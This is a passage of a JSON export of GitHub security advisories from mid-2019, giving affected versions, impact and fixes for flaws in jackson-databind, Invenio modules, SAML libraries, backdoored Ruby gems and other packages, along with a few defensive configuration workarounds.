    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9.2. This occurs when Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the logback jar in the classpath.",
    "summary": "Deserialization of untrusted data in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-6fpp-rgj9-8rwc",
    "publishedAt": "2019-08-01T19:18:00Z",
    "description": "SubTypeValidator.java in FasterXML jackson-databind before 2.9.9.2 mishandles default typing when ehcache is used (because of net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup), leading to remote code execution.",
    "summary": "Deserialization of untrusted data in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-25pc-85qf-6j69",
    "publishedAt": "2019-08-01T19:17:53Z",
    "description": "In Apache Storm versions 1.1.0 to 1.2.2, when the user is using the storm-kafka-client or storm-kafka modules, it is possible to cause the Storm UI daemon to deserialize user provided bytes into a Java class.",
    "summary": "Critical severity vulnerability that affects org.apache.storm:storm-kafka and org.apache.storm:storm-kafka-client"
  },
  {
    "ghsaId": "GHSA-jvpp-hxjj-5ccc",
    "publishedAt": "2019-08-01T19:17:45Z",
    "description": "It was found that the Apache ActiveMQ client before 5.15.5 exposed a remote shutdown command in the ActiveMQConnection class. An attacker logged into a compromised broker could use this flaw to achieve denial of service on a connected client.",
    "summary": "Moderate severity vulnerability that affects org.apache.activemq:activemq-client"
  },
  {
    "ghsaId": "GHSA-3gm7-v7vw-866c",
    "publishedAt": "2019-08-01T19:17:35Z",
    "description": "In Apache Solr, the DataImportHandler, an optional but popular module to pull in data from databases and other sources, has a feature in which the whole DIH configuration can come from a request's \"dataConfig\" parameter. The debug mode of the DIH admin screen uses this to allow convenient debugging / development of a DIH config. Since a DIH config can contain scripts, this parameter is a security risk. Starting with version 8.2.0 of Solr, use of this parameter requires setting the Java System property \"enable.dih.dataConfigParam\" to true.",
    "summary": "XML External Entity (XXE) Injection in Apache Solr"
  },
  {
    "ghsaId": "GHSA-grgm-pph5-j5h7",
    "publishedAt": "2019-07-31T04:22:49Z",
    "description": "A flaw was discovered in the way Ansible templating was implemented in versions before 2.6.18, 2.7.12 and 2.8.2, causing the possibility of information disclosure through unexpected variable substitution. By taking advantage of unintended variable substitution the content of any variable may be disclosed.",
    "summary": "Moderate severity vulnerability that affects ansible"
  },
  {
    "ghsaId": "GHSA-7j93-2h6r-hm49",
    "publishedAt": "2019-07-31T04:22:36Z",
    "description": "Cross-site scripting (XSS) vulnerability in http-file-server (all versions) allows an attacker with access to the server file system to execute arbitrary JavaScript code in victim's browser.",
    "summary": "Moderate severity vulnerability that affects http-file-server"
  },
  {
    "ghsaId": "GHSA-j657-59rv-qwm6",
    "publishedAt": "2019-07-31T04:22:27Z",
    "description": "Cross-site scripting (XSS) vulnerability in min-http-server (all versions) allows an attacker with access to the server file system to execute arbitrary JavaScript code in victim's browser.",
    "summary": "Moderate severity vulnerability that affects min-http-server"
  },
  {
    "ghsaId": "GHSA-wqfc-cr59-h64p",
    "publishedAt": "2019-07-31T04:22:15Z",
    "description": "Yarn before 1.17.3 is vulnerable to Missing Encryption of Sensitive Data due to HTTP URLs in lockfile causing unencrypted authentication data to be sent over the network.",
    "summary": "High severity vulnerability that affects yarn"
  },
  {
    "ghsaId": "GHSA-qpxp-5j56-gg3x",
    "publishedAt": "2019-07-31T04:22:03Z",
    "description": "Zendesk Samlr before 2.6.2 allows an XML nodes comment attack such as a name_id node with user@example.com followed by <!---->. and then the attacker's domain name.",
    "summary": "Moderate severity vulnerability that affects samlr"
  },
  {
    "ghsaId": "GHSA-rqp5-pg7w-832p",
    "publishedAt": "2019-07-31T04:21:27Z",
    "description": "The datagrid gem 1.0.6 for Ruby, as distributed on RubyGems.org, included a code-execution backdoor inserted by a third party.",
    "summary": "Critical severity vulnerability that affects datagrid"
  },
  {
    "ghsaId": "GHSA-wg6j-r28m-7293",
    "publishedAt": "2019-07-31T04:21:19Z",
    "description": "The simple_captcha2 gem 0.2.3 for Ruby, as distributed on RubyGems.org, included a code-execution backdoor inserted by a third party.",
    "summary": "Critical severity vulnerability that affects simple_captcha2"
  },
  {
    "ghsaId": "GHSA-j3jp-gvr5-7hwq",
    "publishedAt": "2019-07-30T20:47:25Z",
    "description": "## WebSocket cross-origin vulnerability\r\n\r\n### Impact\r\nThis is a Cross-Site Request Forgery (CSRF) vulnerability. It affects Socket.IO and Engine.IO web servers that authenticate clients using cookies.\r\n\r\n### Patches\r\npython-engineio version 3.9.0 patches this vulnerability by adding server-side Origin header checks.\r\n\r\n### Workarounds\r\nDo not use cookies for client authentication, or else add a CSRF token to the connection URL.\r\n\r\n### References\r\nhttps://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)\r\nhttps://www.christian-schneider.net/CrossSiteWebSocketHijacking.html\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [python-engineio](http://github.com/miguelgrinberg/python-engineio)\r\n\r\n",
    "summary": "Low severity vulnerability that affects python-engineio"
  },
  {
    "ghsaId": "GHSA-hf4p-jm7r-vjjj",
    "publishedAt": "2019-07-26T16:10:39Z",
    "description": "An issue was discovered in EthereumJ 1.8.2. There is Unsafe Deserialization in ois.readObject in mine/Ethash.java and decoder.readObject in crypto/ECKey.java. When a node syncs and mines a new block, arbitrary OS commands can be run on the server.",
    "summary": "Critical severity vulnerability that affects org.ethereum:ethereumj-core"
  },
  {
    "ghsaId": "GHSA-grmf-4fq6-2r79",
    "publishedAt": "2019-07-26T16:10:28Z",
    "description": "aubio v0.4.0 to v0.4.8 has a Buffer Overflow in new_aubio_tempo.",
    "summary": "Critical severity vulnerability that affects aubio"
  },
  {
    "ghsaId": "GHSA-c6jq-h4jp-72pr",
    "publishedAt": "2019-07-26T16:10:25Z",
    "description": "aubio v0.4.0 to v0.4.8 has a new_aubio_onset NULL pointer dereference.",
    "summary": "High severity vulnerability that affects aubio"
  },
  {
    "ghsaId": "GHSA-7vvr-h4p5-m7fh",
    "publishedAt": "2019-07-26T16:10:20Z",
    "description": "aubio v0.4.0 to v0.4.8 has a NULL pointer dereference in new_aubio_filterbank",
    "summary": "High severity vulnerability that affects aubio"
  },
  {
    "ghsaId": "GHSA-hrj5-qp7x-rpg6",
    "publishedAt": "2019-07-26T16:10:15Z",
    "description": "marginalia < 1.6 is affected by: SQL Injection. The impact is: The impact is a injection of any SQL queries when a user controller argument is added as a component. The component is: Affects users that add a component that is user controller, for instance a parameter or a header. The attack vector is: Hacker inputs a SQL to a vulnerable vector(header, http parameter, etc). The fixed version is: 1.6.",
    "summary": "Critical severity vulnerability that affects marginalia"
  },
  {
    "ghsaId": "GHSA-hh56-x62g-gvhc",
    "publishedAt": "2019-07-26T16:10:06Z",
    "description": "Premium Software CLEditor 1.4.5 and earlier is affected by: Cross Site Scripting (XSS). The impact is: An attacker might be able to inject arbitrary html and script code into the web site. The component is: jQuery plug-in. The attack vector is: the victim must open a crafted href attribute of a link (A) element.",
    "summary": "Moderate severity vulnerability that affects CLEditor"
  },
  {
    "ghsaId": "GHSA-vg35-vc9f-q7x2",
    "publishedAt": "2019-07-26T16:09:54Z",
    "description": "Ladon since 0.6.1 (since ebef0aae48af78c159b6fce81bc6f5e7e0ddb059) is affected by: XML External Entity (XXE). The impact is: Information Disclosure, reading files and reaching internal network endpoints. The component is: SOAP request handlers. For instance: https://bitbucket.org/jakobsg/ladon/src/42944fc012a3a48214791c120ee5619434505067/src/ladon/interfaces/soap.py#lines-688. The attack vector is: Send a specially crafted SOAP call.",
    "summary": "Moderate severity vulnerability that affects ladon"
  },
  {
    "ghsaId": "GHSA-hf23-9pf7-388p",
    "publishedAt": "2019-07-26T16:09:47Z",
    "description": "It was found that xstream API version 1.4.10 before 1.4.11 introduced a regression for a previous deserialization flaw. If the security framework has not been initialized, it may allow a remote attacker to run arbitrary shell commands when unmarshalling XML or any supported format. e.g. JSON. (regression of CVE-2013-7285)",
    "summary": "Critical severity vulnerability that affects com.thoughtworks.xstream:xstream"
  },
  {
    "ghsaId": "GHSA-mpf2-q34c-fc6j",
    "publishedAt": "2019-07-22T14:53:58Z",
    "description": "scapy 2.4.0 is affected by: Denial of Service. The impact is: infinite loop, resource consumption and program unresponsive. The component is: _RADIUSAttrPacketListField.getfield(self..). The attack vector is: over the network or in a pcap. both work.",
    "summary": "High severity vulnerability that affects scapy"
  },
  {
    "ghsaId": "GHSA-x5rq-j2xg-h7qm",
    "publishedAt": "2019-07-19T16:13:07Z",
    "description": "lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.",
    "summary": "Prototype pollution in lodash"
  },
  {
    "ghsaId": "GHSA-5wv5-4vpf-pj6m",
    "publishedAt": "2019-07-19T16:12:46Z",
    "description": "The Pallets Project Flask before 1.0 is affected by: unexpected memory usage. The impact is: denial of service. The attack vector is: crafted encoded JSON data. The fixed version is: 1. NOTE: this may overlap CVE-2018-1000656.",
    "summary": "Low severity vulnerability that affects flask"
  },
  {
    "ghsaId": "GHSA-9ccv-p7fg-m73x",
    "publishedAt": "2019-07-18T15:38:41Z",
    "description": "python-libnmap is affected by: XML Injection. The impact is: Denial of service (DoS) by consuming resources. The component is: XML Parsing. The attack vector is: Specially crafted XML payload.",
    "summary": "Moderate severity vulnerability that affects python-libnmap"
  },
  {
    "ghsaId": "GHSA-r7j3-vvh2-xrpj",
    "publishedAt": "2019-07-18T13:19:22Z",
    "description": "In lib/mini_magick/image.rb in MiniMagick before 4.9.4, a fetched remote image filename could cause remote command execution because Image.open input is directly passed to Kernel#open, which accepts a '|' character followed by a command.",
    "summary": "High severity vulnerability that affects mini_magick"
  },
  {
    "ghsaId": "GHSA-5frh-8cmj-gc59",
    "publishedAt": "2019-07-17T19:14:18Z",
    "description": "## Microsoft Security Advisory CVE-2019-1167: Windows Defender Application Control Security Feature Bypass Vulnerability\r\n\r\n# Microsoft Security Advisory CVE-2019-1167: Windows Defender Application Control Security Feature Bypass Vulnerability\r\n\r\n## Executive Summary\r\n\r\nA security feature bypass vulnerability exists in Windows Defender Application Control (WDAC) which could allow an attacker to bypass WDAC enforcement.\r\nAn attacker who successfully exploited this vulnerability could circumvent PowerShell Core Constrained Language Mode on the machine.\r\n\r\n To exploit the vulnerability,\r\nan attacker would first have access to the local machine where PowerShell is running in Constrained Language mode.\r\nBy doing that an attacker could leverage script debugging to abuse signed modules in an unintended way.\r\n\r\nThe update addresses the vulnerability by correcting how PowerShell functions in Constrained Language Mode.\r\nSystem administrators are advised to update PowerShell Core to an unaffected version (see [affected software](#user-content-affected-software).)\r\n\r\n## Discussion\r\n\r\nPlease use PowerShell/PowerShell#TBD for discussion of this advisory.\r\n\r\n## <a name=\"affected-software\">Affected Software</a>\r\n\r\nThe vulnerability affects PowerShell Core prior to the following versions:\r\n\r\n| PowerShell Core Version | Fixed in          |\r\n|-------------------------|-------------------|\r\n| 6.1                     | 6.1.5               |\r\n| 6.2                     | 6.2.2               |\r\n\r\n## Advisory FAQ\r\n\r\n### How do I know if I am affected?\r\n\r\nIf all of the following are true:\r\n\r\n1. Run `pwsh -v`, then, check the version in the table in [Affected Software](#user-content-affected-software) to see if your version of PowerShell Core is affected.\r\n1. If you are running a version of PowerShell Core where the executable is not `pwsh` or `pwsh.exe`, then you are affected.  This only existed for preview version of `6.0`.\r\n\r\n### How do I update to an unaffected version?\r\n\r\nFollow the instructions at [Installing PowerShell Core](https://docs.microsoft.com/en-us/powershell/scripting/setup/installing-powershell?view=powershell-6) to install the latest version of PowerShell Core.\r\n\r\n## Other Information\r\n\r\n### Reporting Security Issues\r\n\r\nIf you have found a potential security issue in PowerShell Core,\r\nplease email details to secure@microsoft.com.\r\n\r\n### Support\r\n\r\nYou can ask questions about this issue on GitHub in the PowerShell organization.\r\nThis is located at https://github.com/PowerShell/.\r\nThe Announcements repo (https://github.com/PowerShell/Announcements)\r\nwill contain this bulletin as an issue and will include a link to a discussion issue where you can ask questions.\r\n\r\n### What if the update breaks my script or module?\r\n\r\nYou can uninstall the newer version of PowerShell Core and install the previous version of PowerShell Core.\r\nThis should be treated as a temporary measure.\r\nTherefore, the script or module should be updated to work with the patched version of PowerShell Core.\r\n\r\n### Acknowledgments\r\n\r\nMicrosoft recognizes the efforts of those in the security community who help us protect customers through coordinated vulnerability disclosure.\r\n\r\nSee [acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments) for more information.\r\n\r\n### External Links\r\n\r\n[CVE-2019-1167](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1167)\r\n\r\n### Revisions\r\n\r\nV1.0 (July 16, 2019): Advisory published.\r\n\r\n*Version 1.0*\r\n*Last Updated 2019-07-16*\r\n\r\n",
    "summary": "High severity vulnerability that affects System.Management.Automation"
  },
  {
    "ghsaId": "GHSA-cmfg-87vq-g5g4",
    "publishedAt": "2019-07-17T15:26:12Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x through 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has JDOM 1.x or 2.x jar in the classpath, an attacker can send a specifically crafted JSON message that allows them to read arbitrary local files on the server.",
    "summary": "Deserialization of untrusted data in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-qr7j-h6gg-jmgc",
    "publishedAt": "2019-07-16T17:42:21Z",
    "description": "An issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.5. Use of Jackson default typing along with a gadget class from iBatis allows exfiltration of content. Fixed in 2.7.9.4, 2.8.11.2, and 2.9.6.",
    "summary": "Critical severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind"
  },
  {
    "ghsaId": "GHSA-mfv8-q39f-mgfg",
    "publishedAt": "2019-07-16T00:52:26Z",
    "description": "## Cross-Site Scripting (XSS) vulnerability in Jinja templates\r\n\r\n### Impact\r\nA Cross-Site Scripting (XSS) vulnerability was discovered in two Jinja templates in the Invenio-Communities module. The vulnerability allows a user to create a new community and include script element tags inside the description and page fields. \r\n\r\n### Patches\r\nThe problem has been patched in v1.0.0a20.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Email us at [info@inveniosoftware.org](mailto:info@inveniosoftware.org)\r\n",
    "summary": "Moderate severity vulnerability that affects invenio-communities"
  },
  {
    "ghsaId": "GHSA-j9m2-6hq2-4r3c",
    "publishedAt": "2019-07-16T00:52:22Z",
    "description": "## Cross-Site Scripting (XSS) vulnerability in JSON, Markdown and iPython Notebook previewers\r\n\r\n### Impact\r\nSeveral Cross-Site Scripting (XSS) vulnerabilities have been found in the JSON, Markdown and iPython Notebook previewers. The vulnerabilities would allow a malicous user to upload a JSON, Markdown or Notebook file with embedded scripts that would be executed by a victims browser.\r\n\r\n### Patches\r\nInvenio-Previewer v1.0.0a12 fixes the issue.\r\n\r\n### Workarounds\r\nYou can remediate the vulnerability without upgrading by disabling the affected previewers. You do this by adding the following to your configuration:\r\n\r\n```python\r\nPREVIEWER_PREFERENCE = [\r\n    'csv_dthreejs',\r\n    'simple_image',\r\n    # 'json_prismjs',\r\n    'xml_prismjs',\r\n    # 'mistune',\r\n    'pdfjs',\r\n    # 'ipynb',\r\n    'zip',\r\n]\r\n```\r\n\r\nAfterwards, you should not be able to preview JSON, Markdown or iPython Notebook files.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Email us at [info@inveniosoftware.org](mailto:info@inveniosoftware.org)\r\n",
    "summary": "Moderate severity vulnerability that affects invenio-previewer"
  },
  {
    "ghsaId": "GHSA-vxh3-mvv7-265j",
    "publishedAt": "2019-07-16T00:52:15Z",
    "description": "## Cross-Site Scripting (XSS) vulnerability in administration interface\r\n\r\n### Impact\r\nA Cross-Site Scripting (XSS) vulnerability was discovered when rendering JSON for a record in the administration interface. The vulnerability could be exploited by e.g. a user who had access to upload a new record, that an admin user would then later view in the admin interface.\r\n\r\n### Patches\r\nAll supported versions of Invenio-Records have been patched. You should upgrade to either v1.0.1, v1.1.1 or v1.2.2\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Email us at [info@inveniosoftware.org](mailto:info@inveniosoftware.org)\r\n",
    "summary": "Moderate severity vulnerability that affects invenio-records"
  },
  {
    "ghsaId": "GHSA-94mf-xfg5-r247",
    "publishedAt": "2019-07-16T00:52:10Z",
    "description": "## APP_ALLOWED_HOSTS not always preventing host header injection\r\n\r\n### Impact\r\nA possible host header injection attack have been identified in Invenio-App.  For an attack to be possible, all conditions below must be met:\r\n\r\n1. Your webserver must have been configured to route all requests to your application. \r\n2. You must have relied on ``APP_ALLOWED_HOSTS`` configuration variable to whitelist allowed host headers.\r\n3. Flask's ``request.host`` must not have been evaluated during request handling.\r\n\r\nAn example of a view which does not evalute ``request.host`` is a simple view using just ``url_for`` to generate an external URL (similar is possible when rendering just a Jinja template):\r\n\r\n```python\r\n@app.route('/')\r\ndef index():\r\n    return url_for('index_url', _external=True)\r\n```\r\n\r\nThis happens, because Werkzeug's trusted host feature, which ``APP_ALLOWED_HOSTS`` rely on, does not check the the list of trusted hosts in it's routing system that ``url_for`` is relying on.\r\n\r\n### Patches\r\nInvenio-App v1.0.6 and v1.1.1 fully fix the issue. \r\n\r\nNote, we strongly recommend (see [Securing your instance](https://invenio.readthedocs.io/en/latest/deployment/securing-your-instance.html#allowed-hosts)) that you never route requests to your application with a wrong host header.  The ``APP_ALLOWED_HOSTS`` configuration variable exists as an extra protective measure because it is easy to misconfigure your web server to allow requests with any host header. \r\n\r\n### Workaround 1 - Configure your webserver\r\n\r\nYou should ensure that you never route requests with a wrong host header to your application. The workaround depends on which web server you are using to proxy requests to your application. In general it involves ensuring that the web server has two virtual hosts defined:\r\n\r\n1. **Default virtual host**: a dummy default virtual host that by default is used unless the webserver can match the host header to another virtual host (i.e. a catch-all).\r\n2. **Application virtual host**: the application virtual host responsible for proxing requests to the application, and configured to only reply to a whitelist of host headers.\r\n\r\nNote, for instance in Nginx if you only configure the application virtual host, by default, it will also act as the default virtual host despite you having configured a whitelist of host headers.\r\n\r\nBelow is an example for Nginx. Note for clarity we have only included the virtual host for port 443, but this also extends to virtual hosts running on any other port.\r\n```\r\n# etc/nginx/nginx.conf\r\nhttp {\r\n  # ...\r\n  include /etc/nginx/conf.d/*.conf;\r\n}\r\n```\r\n\r\n**Default virtual host**\r\n\r\nNotice, the ``server_name`` is ``_`` and the ``listen`` directive has it marked as ``default_server``.\r\n\r\n```\r\n# etc/nginx/conf.d/default.conf\r\nserver {\r\n  listen 443 default_server;\r\n  listen [::]:443 default_server;\r\n  server_name _;\r\n\r\n  # ... \r\n\r\n  return 301 https://www.example.com;\r\n}\r\n```\r\n\r\n**Application virtual host**\r\n\r\nNotice, the ``server_name`` is set to the host header whitelist.\r\n\r\n```\r\n# etc/nginx/conf.d/app.conf\r\nserver {\r\n  listen 443;\r\n  listen [::]:443;\r\n  server_name www.example.com;\r\n\r\n  # ...\r\n}\r\n```\r\n\r\n### Workaround 2 - Include application snippet\r\n\r\nWe strongly recommend that you use the method described in Workaround 1.\r\n\r\nIf you are not able to upgrade to the patched versions of Invenio-App, you can include the following code snippet in your application to force evaluation of ``request.hosts``.\r\n\r\n```python\r\n@app.before_request\r\ndef before_request():\r\n    request.host\r\n```\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Email us at [info@inveniosoftware.org](mailto:info@inveniosoftware.org)\r\n",
    "summary": "Moderate severity vulnerability that affects invenio-app"
  },
  {
    "ghsaId": "GHSA-wg9m-gw3h-hg83",
    "publishedAt": "2019-07-16T00:42:27Z",
    "description": "The field_test gem 0.3.0 for Ruby has unvalidated input. A method call that is expected to return a value from a certain set of inputs can be made to return any input, which can be dangerous depending on how applications use it. If an application treats arbitrary variants as trusted, this can lead to a variety of potential vulnerabilities like SQL injection or cross-site scripting (XSS).",
    "summary": "Moderate severity vulnerability that affects field_test"
  },
  {
    "ghsaId": "GHSA-6677-83pp-f862",
    "publishedAt": "2019-07-16T00:42:02Z",
    "description": "@nuxt/devalue before 1.2.3, as used in Nuxt.js before 2.6.2, mishandles object keys, leading to XSS.",
    "summary": "Moderate severity vulnerability that affects @nuxt/devalue"
  },
  {
    "ghsaId": "GHSA-4g4c-8gqh-m4vm",
    "publishedAt": "2019-07-16T00:41:55Z",
    "description": "The paranoid2 gem 1.1.6 for Ruby, as distributed on RubyGems.org, included a code-execution backdoor inserted by a third party. The current version, without this backdoor, is 1.1.5.",
    "summary": "Critical severity vulnerability that affects paranoid2"
  },
  {
    "ghsaId": "GHSA-rg32-m3hf-772v",
    "publishedAt": "2019-07-16T00:41:40Z",
    "description": "Slanger 0.6.0 is affected by: Remote Code Execution (RCE). The impact is: A remote attacker can execute arbitrary commands by sending a crafted request to the server. The component is: Message handler & request validator. The attack vector is: Remote unauthenticated. The fixed version is: after commit 5267b455caeb2e055cccf0d2b6a22727c111f5c3.",
    "summary": "Critical severity vulnerability that affects slanger"
  },
  {
    "ghsaId": "GHSA-2mp5-m968-gwr2",
    "publishedAt": "2019-07-16T00:41:34Z",
    "description": "A path traversal vulnerability in <= v0.2.6 of http-file-server npm module allows attackers to list files in arbitrary folders.",
    "summary": "Moderate severity vulnerability that affects http-file-server"
  },
  {
    "ghsaId": "GHSA-8w3j-g983-8jh5",
    "publishedAt": "2019-07-11T14:23:09Z",
    "description": "## Enumeration Attack\r\n\r\n### Impact\r\n\r\nVersions prior to 3.6.0 could allow an account enumeration attack via account linking.\r\n\r\n`ParseError.ACCOUNT_ALREADY_LINKED(208)` was thrown BEFORE the AuthController checks the password and throws a `ParseError.SESSION_MISSING(206)` for Insufficient auth.  An attacker can guess ids and get information about linked accounts/email addresses.\r\n\r\n\r\n### Patches\r\n\r\nThe exploit is closed with the release of 3.6.0 of parse-server\r\n\r\n### Workarounds\r\n\r\nno\r\n\r\n### References\r\n\r\nDescription of [Enumeration Attack](https://www.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)#Description_of_the_Issue)\r\n\r\nThe fix: [73b0f9a](https://github.com/parse-community/parse-server/commit/73b0f9a339b81f5d757725dc557955a7b670a3ec)\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in the [parse-server](https://github.com/parse-community/parse-server)\r\n* [Parse Community Vulnerability Disclosure Program](https://github.com/parse-community/parse-server/blob/master/SECURITY.md)\r\n\r\n",
    "summary": "Low severity vulnerability that affects parse-server"
  },
  {
    "ghsaId": "GHSA-jf85-cpcp-j695",
    "publishedAt": "2019-07-10T19:45:23Z",
    "description": "Affected versions of lodash are vulnerable to Prototype Pollution. \nThe function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload.",
    "summary": "Lodash vulnerable to Prototype Pollution"
  },
  {
    "ghsaId": "GHSA-5h5r-ffc4-c455",
    "publishedAt": "2019-07-08T20:32:35Z",
    "description": "The strong_password gem 0.0.7 for Ruby, as distributed on RubyGems.org, included a code-execution backdoor inserted by a third party. The current version, without this backdoor, is 0.0.6.",
    "summary": "Critical severity vulnerability that affects strong_password"
  },
  {
    "ghsaId": "GHSA-c9jj-3wvg-q65h",
    "publishedAt": "2019-07-05T21:12:54Z",
    "description": "Apache PDFBox 2.0.14 does not properly initialize the XML parser, which allows context-dependent attackers to conduct XML External Entity (XXE) attacks via a crafted XFDF.",
    "summary": "High severity vulnerability that affects org.apache.pdfbox:pdfbox"
  },
  {
    "ghsaId": "GHSA-94hm-8q65-rmxm",
    "publishedAt": "2019-07-05T21:11:43Z",
    "description": "OmniAuth OmnitAuth-SAML 1.9.0 and earlier may incorrectly utilize the results of XML DOM traversal and canonicalization APIs in such a way that an attacker may be able to manipulate the SAML data without invalidating the cryptographic signature, allowing the attack to potentially bypass authentication to SAML service providers.",
    "summary": "High severity vulnerability that affects omniauth-saml"
  },
  {
    "ghsaId": "GHSA-x2fr-v8wf-8wwv",
    "publishedAt": "2019-07-05T21:11:35Z",
    "description": "OneLogin Ruby-SAML 1.6.0 and earlier may incorrectly utilize the results of XML DOM traversal and canonicalization APIs in such a way that an attacker may be able to manipulate the SAML data without invalidating the cryptographic signature, allowing the attack to potentially bypass authentication to SAML service providers.",
    "summary": "High severity vulnerability that affects ruby-saml"
  },
  {
    "ghsaId": "GHSA-j8j8-348v-wfm3",
    "publishedAt": "2019-07-05T21:11:26Z",
    "description": "OneLogin PythonSAML 2.3.0 and earlier may incorrectly utilize the results of XML DOM traversal and canonicalization APIs in such a way that an attacker may be able to manipulate the SAML data without invalidating the cryptographic signature, allowing the attack to potentially bypass authentication to SAML service providers.",
    "summary": "High severity vulnerability that affects python-saml"
  },
  {
    "ghsaId": "GHSA-5p5w-j3g7-w4wv",
    "publishedAt": "2019-07-05T21:11:18Z",
    "description": "Clever saml2-js 2.0 and earlier may incorrectly utilize the results of XML DOM traversal and canonicalization APIs in such a way that an attacker may be able to manipulate the SAML data without invalidating the cryptographic signature, allowing the attack to potentially bypass authentication to SAML service providers.",
    "summary": "High severity vulnerability that affects saml2-js"
  },
  {
    "ghsaId": "GHSA-958r-g534-ccmr",
    "publishedAt": "2019-07-05T21:11:13Z",
    "description": "madskristensen Miniblog.Core through 2019-01-16 allows remote attackers to execute arbitrary ASPX code via an IMG element with a data: URL, because SaveFilesToDisk in Controllers/BlogController.cs writes a decoded base64 string to a file without validating the extension.",
    "summary": "Moderate severity vulnerability that affects MadsKristensen.AspNetCore.Miniblog"
  },
  {
    "ghsaId": "GHSA-ffq8-576r-v26g",
    "publishedAt": "2019-07-05T21:11:05Z",
    "description": "A HTTP/2 implementation built using any version of the Python HPACK library between v1.0.0 and v2.2.0 could be targeted for a denial of service attack, specifically a so-called \"HPACK Bomb\" attack. This attack occurs when an attacker inserts a header field that is exactly the size of the HPACK dynamic header table into the dynamic header table. The attacker can then send a header block that is simply repeated requests to expand that field in the dynamic table. This can lead to a gigantic compression ratio of 4,096 or better, meaning that 16kB of data can decompress to 64MB of data on the target machine.",
    "summary": "High severity vulnerability that affects hpack"
  },
  {
    "ghsaId": "GHSA-x64g-wjmw-w328",
    "publishedAt": "2019-07-05T21:10:52Z",
    "description": "OpenStack Ironic Inspector (aka ironic-inspector or ironic-discoverd), when debug mode is enabled, might allow remote attackers to access the Flask console and execute arbitrary Python code by triggering an error.",
    "summary": "Moderate severity vulnerability that affects ironic-discoverd"
  },
  {
    "ghsaId": "GHSA-h582-2pch-3xv3",
    "publishedAt": "2019-07-05T21:10:39Z",
    "description": "The session backends in Django before 1.4.21, 1.5.x through 1.6.x, 1.7.x before 1.7.9, and 1.8.x before 1.8.3 allows remote attackers to cause a denial of service (session store consumption) via multiple requests with unique session keys.",
    "summary": "High severity vulnerability that affects django"
  },
  {
    "ghsaId": "GHSA-h595-8pw6-5q6v",
    "publishedAt": "2019-07-05T21:08:36Z",
    "description": "DNN (aka DotNetNuke) 9.2 through 9.2.1 uses a weak encryption algorithm to protect input parameters.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-pf46-gqg9-j3v3",
    "publishedAt": "2019-07-05T21:08:24Z",
    "description": "DNN (aka DotNetNuke) 9.2 through 9.2.1 incorrectly converts encryption key source values, resulting in lower than expected entropy.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-xx3h-j3cx-8qfj",
    "publishedAt": "2019-07-05T21:08:20Z",
    "description": "DNN (aka DotNetNuke) 9.2 through 9.2.2 incorrectly converts encryption key source values, resulting in lower than expected entropy. NOTE: this issue exists because of an incomplete fix for CVE-2018-15812.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-j3g9-6fx5-gjv7",
    "publishedAt": "2019-07-05T21:08:16Z",
    "description": "DNN (aka DotNetNuke) 9.2 through 9.2.2 uses a weak encryption algorithm to protect input parameters. NOTE: this issue exists because of an incomplete fix for CVE-2018-15811.",
    "summary": "TODO"
  },
  {
    "ghsaId": "GHSA-mcg9-64cp-xwp7",
    "publishedAt": "2019-07-05T21:08:09Z",
    "description": "Hawt Hawtio through 2.5.0 is vulnerable to SSRF, allowing a remote attacker to trigger an HTTP request from an affected server to an arbitrary host via the initial /proxy/ substring of a URI.",
    "summary": "Critical severity vulnerability that affects io.hawt:hawtio-core"
  },
  {
    "ghsaId": "GHSA-7v35-qwwj-p98g",
    "publishedAt": "2019-07-05T21:07:40Z",
    "description": "In DiffPlug Spotless before 1.20.0 (library and Maven plugin) and before 3.20.0 (Gradle plugin), the XML parser would resolve external entities over both HTTP and HTTPS and didn't respect the resolveExternalEntities setting. For example, this allows disclosure of file contents to a MITM attacker if a victim performs a spotlessApply operation on an untrusted XML file.",
    "summary": "High severity vulnerability that affects com.diffplug.spotless:spotless-plugin-gradle and com.diffplug.spotless:spotless-plugin-maven"
  },
  {
    "ghsaId": "GHSA-mph4-vhrx-mv67",
    "publishedAt": "2019-07-05T21:07:27Z",
    "description": "FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.",
    "summary": "Deserialization of Untrusted Data in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-g8m7-qhv7-9h5x",
    "publishedAt": "2019-07-05T21:07:14Z",
    "description": "Serve-here is vulnerable to a directory traversal attack (3.2.2 and before)",
    "summary": "Serve-here is vulnerable to a directory traversal attack"
  },
  {
    "ghsaId": "GHSA-h92m-42h4-82f6",
    "publishedAt": "2019-07-05T21:06:58Z",
